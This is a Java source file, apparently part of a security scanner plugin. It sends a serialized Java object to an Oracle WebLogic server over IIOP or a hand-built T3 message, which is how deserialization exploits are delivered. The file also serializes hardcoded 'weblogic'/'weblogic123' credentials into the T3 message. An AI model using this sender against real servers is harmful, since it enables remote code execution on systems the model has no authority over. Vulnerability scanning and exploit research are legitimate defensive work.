package com.gbw.scanner.plugins.scripts.weblogic;

import com.gbw.scanner.Host;
import com.gbw.scanner.connection.Connection;
import com.gbw.scanner.utils.ByteDataUtils;
import com.gbw.scanner.utils.Serializer;
import com.xmap.api.utils.TextUtils;
import weblogic.iiop.IOPProfile;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.util.Hashtable;

public class GBWPayloadSend {

    public static void send(GBWScanWeblogicConfig config,Host host,Object payload){

        String protocol = host.getProto();

        if(protocol.equals("iiop")){
            sendIIOP(config,host,payload);
        }else{
            sendT3(config,host,Serializer.serialize(payload));
        }
    }

    public static void sendIIOP(GBWScanWeblogicConfig config,Host host, Object payload) {
        try {
            String url = String.format("iiop://%s:%s", host.getIp(), host.getPort());
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, url);
            env.put("weblogic.jndi.requestTimeout", config.getReadTimeout() + "");
            IOPProfile.IP=host.getIp();
            IOPProfile.PORT=host.getPort();
            InitialContext initialContext = new InitialContext(env);
            initialContext.rebind("sectest", payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String sendT3Header(Connection connection,GBWScanWeblogicConfig config, Host host)  throws Exception{

        String proto = host.getProto();

        if (TextUtils.isEmpty(proto) || proto.equals("http"))
            proto = "t3";


        else if (proto.equals("https"))
            proto = "t3s";

        if (!proto.startsWith("t3"))
            proto = "t3";

        String header = String.format("%s 7.0.0.0\nAS:10\nHL:19\n\n", proto);

        connection.send(header.getBytes());
        String version = connection.readLine();

        return version;
    }

    public static void sendT3(GBWScanWeblogicConfig config, Host host, byte[] payload){

        Connection connection = GBWWeblogicConnection.makeConnection(config, host);
        if (connection == null)
            return;

        try {

            sendT3Header(connection,config,host);

            String cmd = "08";
            String qos = "65";
            String flags = "01";
            String responseId = "ffffffff";
            String invokableId = "ffffffff";
            String abbrevOffset = "00000000";
            String countLength = "01";
            String capacityLength = "10";//必须大于上面设置的AS值
            String readObjectType = "00";//00 object deserial 01 ascii

            StringBuilder datas = new StringBuilder();
            datas.append(cmd);
            datas.append(qos);
            datas.append(flags);
            datas.append(responseId);
            datas.append(invokableId);
            datas.append(abbrevOffset);
            countLength = "04";
            datas.append(countLength);
            String pahse1Str = ByteDataUtils.toHex(payload);
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(pahse1Str);
            AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "weblogic123");
            String phase4 = ByteDataUtils.toHex(Serializer.serialize(authenticatedUser));
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(phase4);

            JVMID src = new JVMID();

            Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class, boolean.class);
            constructor.setAccessible(true);
            src = (JVMID) constructor.newInstance(InetAddress.getByName("127.0.0.1"), false);
            Field serverName = src.getClass().getDeclaredField("differentiator");
            serverName.setAccessible(true);
            serverName.set(src, 1);

            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(ByteDataUtils.toHex(Serializer.serialize(src)));

            JVMID dst = new JVMID();

            constructor = JVMID.class.getDeclaredConstructor(InetAddress.class, boolean.class);
            constructor.setAccessible(true);
            src = (JVMID) constructor.newInstance(InetAddress.getByName("127.0.0.1"), false);
            serverName = src.getClass().getDeclaredField("differentiator");
            serverName.setAccessible(true);
            serverName.set(dst, 1);
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(ByteDataUtils.toHex(Serializer.serialize(dst)));

            byte[] headers = ByteDataUtils.parseHex(datas.toString());
            int len = headers.length + 4;
            String hexLen = Integer.toHexString(len);
            StringBuilder dataLen = new StringBuilder();

            if (hexLen.length() < 8) {
                for (int i = 0; i < (8 - hexLen.length()); i++) {
                    dataLen.append("0");
                }
            }

            dataLen.append(hexLen);
            connection.send(ByteDataUtils.parseHex(dataLen + datas.toString()));
        } catch (Exception e) {
            e.printStackTrace();
        }finally {

            try {
                connection.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

}
